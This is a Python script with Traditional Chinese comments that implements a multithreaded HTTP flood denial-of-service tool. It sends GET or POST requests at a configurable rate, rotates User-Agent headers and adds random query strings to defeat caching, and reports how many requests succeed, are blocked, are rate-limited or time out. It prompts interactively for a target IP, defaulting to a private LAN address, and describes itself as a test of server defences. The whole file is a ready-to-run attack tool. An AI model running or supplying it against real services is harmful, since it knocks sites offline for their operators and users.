"""
HTTP Flood 攻擊 - 發送完整的 HTTP 請求
使用真實 TCP 連接,會真正消耗伺服器資源
比 SYN Flood 更有效地測試 HTTP 層防禦
"""
import requests
import threading
import time
from collections import defaultdict
import random
import string

class HTTPFloodAttacker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.stats = defaultdict(int)
        self.stats_lock = threading.Lock()
        self.running = False
        
        # 多樣化的 User-Agent
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/91.0.4472.124',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) Chrome/91.0.4472.124',
        ]
    
    def generate_random_url(self):
        """生成隨機 URL 避免緩存"""
        rand = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        timestamp = int(time.time() * 1000)
        return f"{self.target_url}?rand={rand}&t={timestamp}"
    
    def generate_headers(self):
        """生成隨機 HTTP 標頭"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['zh-TW', 'en-US', 'ja-JP', 'ko-KR']),
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        }
    
    def send_get_request(self):
        """發送 GET 請求"""
        try:
            url = self.generate_random_url()
            headers = self.generate_headers()
            
            response = requests.get(url, headers=headers, timeout=5)
            
            with self.stats_lock:
                if response.status_code == 200:
                    self.stats['success'] += 1
                elif response.status_code == 403:
                    self.stats['blocked'] += 1
                elif response.status_code == 429:
                    self.stats['rate_limited'] += 1
                else:
                    self.stats['other'] += 1
            
            return True
            
        except requests.exceptions.Timeout:
            with self.stats_lock:
                self.stats['timeout'] += 1
            return False
        except requests.exceptions.ConnectionError:
            with self.stats_lock:
                self.stats['connection_error'] += 1
            return False
        except Exception as e:
            with self.stats_lock:
                self.stats['failed'] += 1
            return False
    
    def send_post_request(self):
        """發送 POST 請求"""
        try:
            url = self.generate_random_url()
            headers = self.generate_headers()
            
            # 生成隨機 POST 數據
            data = {
                'data': ''.join(random.choices(string.ascii_letters, k=100)),
                'timestamp': str(time.time()),
            }
            
            response = requests.post(url, headers=headers, data=data, timeout=5)
            
            with self.stats_lock:
                if response.status_code == 200:
                    self.stats['success'] += 1
                elif response.status_code == 403:
                    self.stats['blocked'] += 1
                elif response.status_code == 429:
                    self.stats['rate_limited'] += 1
                else:
                    self.stats['other'] += 1
            
            return True
            
        except requests.exceptions.Timeout:
            with self.stats_lock:
                self.stats['timeout'] += 1
            return False
        except requests.exceptions.ConnectionError:
            with self.stats_lock:
                self.stats['connection_error'] += 1
            return False
        except Exception as e:
            with self.stats_lock:
                self.stats['failed'] += 1
            return False
    
    def attack_worker(self, method='GET', duration=30, delay=0.01):
        """攻擊工作線程"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            if method.upper() == 'GET':
                self.send_get_request()
            elif method.upper() == 'POST':
                self.send_post_request()
            
            time.sleep(delay)
    
    def start_attack(self, method='GET', duration=30, threads=50, requests_per_second=100):
        """開始攻擊"""
        print("="*80)
        print("🌊 HTTP Flood 攻擊測試")
        print("="*80)
        print(f"目標: {self.target_url}")
        print(f"方法: {method.upper()}")
        print(f"持續時間: {duration} 秒")
        print(f"線程數: {threads}")
        print(f"目標速率: {requests_per_second} 請求/秒")
        print(f"每線程延遲: {1000/requests_per_second*threads:.1f} ms")
        print("="*80 + "\n")
        
        # 計算每個線程的延遲
        delay = threads / requests_per_second
        
        # 初始化統計
        with self.stats_lock:
            self.stats = defaultdict(int)
        
        self.running = True
        start_time = time.time()
        
        # 啟動攻擊線程
        attack_threads = []
        for i in range(threads):
            t = threading.Thread(
                target=self.attack_worker,
                args=(method, duration, delay),
                name=f"HTTPFlood-{i+1}"
            )
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # 監控進度
        try:
            last_total = 0
            while self.running:
                time.sleep(2)
                elapsed = time.time() - start_time
                
                if elapsed >= duration:
                    self.running = False
                    break
                
                with self.stats_lock:
                    success = self.stats['success']
                    blocked = self.stats['blocked']
                    rate_limited = self.stats['rate_limited']
                    timeout = self.stats['timeout']
                    conn_err = self.stats['connection_error']
                    failed = self.stats['failed']
                    other = self.stats['other']
                
                total = success + blocked + rate_limited + timeout + conn_err + failed + other
                current_rate = (total - last_total) / 2.0  # 每2秒的速率
                last_total = total
                
                print(f"⏱️  [{elapsed:.1f}s] 總計: {total} | "
                      f"✅成功: {success} | 🚫攔截: {blocked} | "
                      f"⏱️超時: {timeout} | ❌失敗: {conn_err + failed} | "
                      f"速率: {current_rate:.1f} req/s")
        
        except KeyboardInterrupt:
            print("\n\n⏹️  收到中斷信號,停止攻擊...")
            self.running = False
        
        # 等待所有線程結束
        for t in attack_threads:
            t.join(timeout=2)
        
        # 顯示最終統計
        self.show_stats(time.time() - start_time)
    
    def show_stats(self, elapsed):
        """顯示統計信息"""
        print("\n" + "="*80)
        print("📊 攻擊統計")
        print("="*80)
        
        with self.stats_lock:
            success = self.stats['success']
            blocked = self.stats['blocked']
            rate_limited = self.stats['rate_limited']
            timeout = self.stats['timeout']
            conn_err = self.stats['connection_error']
            failed = self.stats['failed']
            other = self.stats['other']
        
        total = success + blocked + rate_limited + timeout + conn_err + failed + other
        
        print(f"總請求數: {total}")
        print(f"  ✅ 成功 (200): {success} ({success/total*100 if total > 0 else 0:.1f}%)")
        print(f"  🚫 被攔截 (403): {blocked} ({blocked/total*100 if total > 0 else 0:.1f}%)")
        print(f"  ⚠️  速率限制 (429): {rate_limited} ({rate_limited/total*100 if total > 0 else 0:.1f}%)")
        print(f"  ⏱️  請求超時: {timeout} ({timeout/total*100 if total > 0 else 0:.1f}%)")
        print(f"  ❌ 連接錯誤: {conn_err} ({conn_err/total*100 if total > 0 else 0:.1f}%)")
        print(f"  ❓ 其他錯誤: {failed + other}")
        
        print(f"\n平均速率: {total/elapsed:.1f} 請求/秒")
        print(f"持續時間: {elapsed:.1f} 秒")
        print("="*80)

def main():
    print("="*80)
    print("🌊 HTTP Flood 攻擊測試工具")
    print("="*80)
    print("發送完整的 HTTP 請求來測試伺服器防禦")
    print("這會真正消耗伺服器資源並觸發 IP 黑名單")
    print("="*80 + "\n")
    
    # 配置攻擊參數
    print("攻擊配置:")
    target_ip = input("目標 IP (默認: 192.168.0.201): ").strip() or "192.168.0.201"
    target_port = input("目標端口 (默認: 8001): ").strip() or "8001"
    target_url = f"http://{target_ip}:{target_port}"
    
    print("\n攻擊方法:")
    print("  1. GET 請求 (推薦)")
    print("  2. POST 請求")
    print("  3. 混合 (輪流使用)")
    method_choice = input("選擇 (默認: 1): ").strip() or "1"
    
    if method_choice == '1':
        method = 'GET'
    elif method_choice == '2':
        method = 'POST'
    else:
        method = 'GET'  # 簡化版本,只用 GET
    
    duration = int(input("\n攻擊持續時間 (秒,默認: 30): ").strip() or "30")
    threads = int(input("並發線程數 (默認: 50): ").strip() or "50")
    rps = int(input("目標請求速率 (請求/秒,默認: 100): ").strip() or "100")
    
    print("\n" + "="*80)
    print("⚠️  攻擊說明:")
    print(f"  - 將使用 {threads} 個線程同時發送 HTTP 請求")
    print(f"  - 目標速率: {rps} 請求/秒")
    print(f"  - 每個請求都是完整的 TCP 連接")
    print(f"  - 會觸發伺服器的 IP 黑名單和速率限制")
    print(f"  - 可在瀏覽器打開 {target_url} 查看卡頓情況")
    print("="*80)
    
    confirm = input("\n確認開始攻擊? (y/n): ").strip().lower()
    if confirm != 'y':
        print("已取消")
        return
    
    # 創建攻擊器並開始攻擊
    attacker = HTTPFloodAttacker(target_url)
    
    try:
        attacker.start_attack(
            method=method,
            duration=duration,
            threads=threads,
            requests_per_second=rps
        )
    except Exception as e:
        print(f"\n❌ 錯誤: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()
